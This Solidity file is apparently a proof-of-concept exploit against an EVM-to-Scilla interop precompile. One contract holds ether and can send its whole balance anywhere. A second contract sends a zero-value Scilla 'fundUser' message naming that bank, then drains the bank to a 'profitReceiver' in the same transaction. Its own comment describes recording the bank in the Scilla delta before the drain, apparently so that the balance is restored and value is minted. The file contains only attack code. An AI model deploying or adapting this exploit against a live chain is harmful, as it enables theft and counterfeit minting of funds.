// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

contract ReusableBank {
    constructor() payable {}

    function flush(address payable to) external {
        uint256 bal = address(this).balance;
        (bool ok, ) = to.call{value: bal}("");
        require(ok, "send failed");
    }

    receive() external payable {}
}

contract ScillaBalanceRestore {
    address constant SCILLA_CALL = 0x000000000000000000000000000000005a494c53;

    ReusableBank public reusableBank;

    constructor() payable {
        reusableBank = new ReusableBank{value: msg.value}();
    }

    function mint(address scillaContract, address payable profitReceiver) external {
        // A zero-value Scilla `fundUser` message that names the EVM bank, recording it in the Scilla
        // delta, before the bank is drained in the same transaction.
        bytes memory args = abi.encode(
            scillaContract,
            "fundUser",
            uint256(0),
            address(reusableBank),
            uint128(0)
        );

        (bool ok, ) = SCILLA_CALL.call(args);
        require(ok, "scilla call failed");

        reusableBank.flush(profitReceiver);
    }
}
